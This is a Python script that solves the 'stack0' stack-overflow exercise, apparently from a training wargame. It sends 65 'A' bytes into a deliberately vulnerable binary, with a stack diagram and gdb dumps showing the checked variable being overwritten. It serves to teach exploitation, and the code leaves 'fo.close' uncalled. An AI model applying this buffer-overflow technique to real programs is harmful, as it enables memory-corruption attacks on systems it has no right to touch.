#!/usr/bin/python3
from subprocess import Popen, PIPE
import shlex

'''
	+----------+-\
	| A A A A  | | <=== FP-72 [ACID] : gets(FP-72) 
	+----------+ |
	   ...       |
	    ...      | 64 bytes in between
	     ...     |
	+----------+-/
	|    VAR   |  <=== FP-8 (var being checked)
	+----------+ 
	| saved FP | 
	+----------+
	| saved LR |  <--- FP 
	+----------+

STACK state before ACID rain
(gdb) x/20xw $fp-72
0xbefff1e4:     0xb6ffbfc4      0x00000003      0xb6e77be8      0x00000000
0xbefff1f4:     0xb6e779f8      0xbefff230      0xb6fd618c      0x00000000
0xbefff204:     0x00000000      0x00010414      0x000104f8      0xb6fb2ba0
0xbefff214:     0x000104a8      0x00000000      0x00010324      0x00000000
0xbefff224:     0x00000000      0x00000000      0xb6e8c294      0xb6fb1000

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE

STACK state after ACID rain
(gdb) x/20xw $fp-72
0xbefff1e4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff1f4:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff204:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff214:     0x41414141      0x41414141      0x41414141      0x41414141
0xbefff224:     0x45444342      0x00000000      0xb6e8c294      0xb6fb1000
'''

target = "./stack0"
payload = "A"*65

# write payload to disk (for manual exploitation)
fo = open(target + '.input', 'wb')
fo.write(payload.encode('utf-8'))
fo.close

p = Popen(shlex.split(target), stdin=PIPE)
p.stdin.write(payload.encode('utf-8'))
p.stdin.flush()				# send payload to target process
